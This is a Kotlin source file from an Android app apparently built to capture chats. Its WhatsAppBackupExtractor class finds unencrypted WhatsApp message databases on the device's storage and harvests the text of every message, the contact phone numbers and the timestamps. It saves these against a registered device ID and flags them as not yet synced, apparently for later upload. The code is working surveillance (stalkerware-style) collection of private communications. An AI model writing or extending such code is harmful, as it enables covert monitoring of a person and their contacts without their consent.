package com.chats.capture.utils

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.os.Build
import android.os.Environment
import com.chats.capture.CaptureApplication
import com.chats.capture.database.ChatDao
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.models.ChatData
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber
import java.io.File

/**
 * Extractor for WhatsApp backup database messages
 * Note: Encrypted backups (msgstore.db.crypt12) cannot be decrypted without device key
 */
class WhatsAppBackupExtractor(private val context: Context) {
    
    private val chatDao: ChatDao = (context.applicationContext as CaptureApplication).database.chatDao()
    private val deviceRegistrationManager = DeviceRegistrationManager(context)
    
    private val whatsappPackage = "com.whatsapp"
    private val whatsappAppName = "WhatsApp"
    
    /**
     * Extract messages from WhatsApp backup database
     * Only works with unencrypted databases (msgstore.db)
     */
    suspend fun extractMessages(): List<ChatData> = withContext(Dispatchers.IO) {
        try {
            val deviceId = deviceRegistrationManager.getDeviceId()
            val chatMessages = mutableListOf<ChatData>()
            
            // Find WhatsApp backup databases
            val backupDatabases = findWhatsAppBackupDatabases()
            
            if (backupDatabases.isEmpty()) {
                Timber.w("No WhatsApp backup databases found")
                return@withContext emptyList()
            }
            
            backupDatabases.forEach { dbFile ->
                try {
                    if (dbFile.name.endsWith(".crypt12") || dbFile.name.endsWith(".crypt14") || dbFile.name.endsWith(".crypt15")) {
                        Timber.w("Encrypted WhatsApp backup found (${dbFile.name}) - cannot decrypt without key")
                        // Note: Cannot decrypt encrypted backups without device key
                        return@forEach
                    }
                    
                    if (dbFile.name == "msgstore.db" && dbFile.exists()) {
                        val messages = extractMessagesFromDatabase(dbFile, deviceId)
                        chatMessages.addAll(messages)
                        Timber.d("Extracted ${messages.size} messages from ${dbFile.absolutePath}")
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error extracting messages from ${dbFile.absolutePath}")
                }
            }
            
            // Save to database
            chatMessages.forEach { chat ->
                try {
                    // Check for duplicates (by text, timestamp, and appPackage)
                    val existing = chatDao.findChatByContent(
                        chat.appPackage,
                        chat.text,
                        chat.timestamp - 5000, // 5 second window
                        chat.timestamp + 5000
                    )
                    
                    if (existing == null) {
                        chatDao.insertChat(chat)
                        Timber.v("WhatsApp backup message saved: ${chat.text.take(50)}")
                    } else {
                        Timber.v("WhatsApp backup message already exists: ${chat.text.take(50)}")
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error saving WhatsApp backup message")
                }
            }
            
            Timber.d("Extracted ${chatMessages.size} WhatsApp messages from backup")
            chatMessages
        } catch (e: Exception) {
            Timber.e(e, "Error extracting WhatsApp backup messages")
            emptyList()
        }
    }
    
    /**
     * Find WhatsApp backup database files
     */
    private fun findWhatsAppBackupDatabases(): List<File> {
        val databases = mutableListOf<File>()
        val externalStorage = Environment.getExternalStorageDirectory()
        
        // Standard WhatsApp backup location
        val databasesDir = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ - Databases may be in app-specific directory
            File(externalStorage, "Android/media/$whatsappPackage/WhatsApp/Databases")
        } else {
            // Android 9 and below - Standard location
            File(externalStorage, "WhatsApp/Databases")
        }
        
        // Also check legacy location
        val legacyDatabasesDir = File(externalStorage, "WhatsApp/Databases")
        
        // Check both locations
        listOf(databasesDir, legacyDatabasesDir).forEach { dir ->
            if (dir.exists() && dir.isDirectory) {
                dir.listFiles()?.forEach { file ->
                    if (file.isFile && (file.name == "msgstore.db" || 
                            file.name.startsWith("msgstore") && 
                            (file.name.endsWith(".db") || file.name.contains("crypt")))) {
                        databases.add(file)
                    }
                }
            }
        }
        
        return databases
    }
    
    /**
     * Extract messages from SQLite database file
     */
    private fun extractMessagesFromDatabase(dbFile: File, deviceId: String?): List<ChatData> {
        val messages = mutableListOf<ChatData>()
        var database: SQLiteDatabase? = null
        
        try {
            // Open database as read-only
            database = SQLiteDatabase.openDatabase(
                dbFile.absolutePath,
                null,
                SQLiteDatabase.OPEN_READONLY
            )
            
            // Query messages table
            // WhatsApp database schema: messages table with columns:
            // _id, key_remote_jid (chat identifier), data (message text), timestamp, media_wa_type, etc.
            val cursor = database.query(
                "messages",
                arrayOf("_id", "key_remote_jid", "data", "timestamp", "media_wa_type"),
                null,
                null,
                null,
                null,
                "timestamp DESC", // Get newest messages first
                null
            )
            
            cursor?.use {
                val idColumn = it.getColumnIndexOrThrow("_id")
                val jidColumn = it.getColumnIndexOrThrow("key_remote_jid")
                val dataColumn = it.getColumnIndexOrThrow("data")
                val timestampColumn = it.getColumnIndexOrThrow("timestamp")
                
                while (it.moveToNext()) {
                    try {
                        val messageId = it.getLong(idColumn)
                        val chatIdentifier = it.getString(jidColumn) // JID format: phone_number@s.whatsapp.net
                        val messageText = it.getString(dataColumn) ?: ""
                        val timestamp = it.getLong(timestampColumn) * 1000 // WhatsApp uses seconds, convert to milliseconds
                        
                        // Skip empty messages or media-only messages without text
                        if (messageText.isBlank()) {
                            continue
                        }
                        
                        // Clean up chat identifier (remove @s.whatsapp.net suffix for readability)
                        val cleanChatIdentifier = chatIdentifier?.substringBefore("@") ?: "unknown"
                        
                        val chatData = ChatData(
                            deviceId = deviceId,
                            appPackage = whatsappPackage,
                            appName = whatsappAppName,
                            chatIdentifier = cleanChatIdentifier,
                            text = messageText,
                            keyHistory = null,
                            mediaUrls = null,
                            timestamp = timestamp,
                            synced = false
                        )
                        
                        messages.add(chatData)
                    } catch (e: Exception) {
                        Timber.e(e, "Error parsing WhatsApp message from database")
                    }
                }
            }
            
        } catch (e: Exception) {
            Timber.e(e, "Error reading WhatsApp database: ${dbFile.absolutePath}")
        } finally {
            database?.close()
        }
        
        return messages
    }
}
